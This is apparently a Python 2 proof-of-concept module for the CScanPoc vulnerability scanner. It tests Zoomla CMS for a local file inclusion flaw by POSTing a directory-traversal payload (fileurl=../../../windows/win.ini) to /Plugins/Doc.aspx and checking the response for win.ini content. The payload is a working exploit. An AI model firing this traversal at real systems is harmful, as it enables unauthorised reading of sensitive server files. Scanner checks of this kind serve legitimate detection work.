# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0102'  # 平台漏洞编号
    name = '逐浪cms文件包含漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-04-09'  # 漏洞公布时间
    desc = '''
    逐浪cms文件包含漏洞漏洞，攻击者可以通过本地文件包含读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=48639
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7e48c477-1576-4201-bf2d-6dd142835e9d'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "btnBill=%e7%94%9f%e6%88%90%e5%90%88%e5%90%8c%e5%88%b0%e4%ba%91%e7%9b%98&Button1=%e6%a0%bc%e5%bc%8f%e9%a2%84%e8%a7%88&fileurl=../../../../../../../../../../windows/win.ini&Mydoc=%e6%88%91%e7%9a%84%e5%90%88%e5%90%8c&selCard=&txtDes=&__VIEWSTATE=/wEPDwUKLTMxMTEyOTYzMQ9kFgICAw9kFgJmDxYCHgtfIUl0ZW1Db3VudAIIFhBmD2QWAmYPFQIBMQzlhazlj7jlkIjlkIxkAgEPZBYCZg8VAgEyDOazleW%2bi%2baWh%2bWHvWQCAg9kFgJmDxUCATMQ6LSt6ZSA5ZCI5ZCMLmRvY2QCAw9kFgJmDxUCATQT5Yqz5Yqo5ZCI5ZCM5LmmLmRvY2QCBA9kFgJmDxUCATUZ6K%2bV55So5ZGY5bel6ICD5qC46KGoLmRvY2QCBQ9kFgJmDxUCATYZ5Zui5L2T5Z%2b56K6t55Sz6K%2b36KGoLmRvY2QCBg9kFgJmDxUCATcW57un5om/5p2D6K%2bB5piO5LmmLmRvY2QCBw9kFgJmDxUCATgc6K%2bJ6K686LSi5Lqn5L%2bd5YWo55Sz6K%2b3LmRvY2RkaEU/PNdxxazElafJNZNrFjYXg8spHysdi8MtZ8%2b7cTQ%3d"
            url = self.target + "/Plugins/Doc.aspx"
            response = requests.post(url, data=payload)
            if response.status_code == 200 and "[extensions]" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
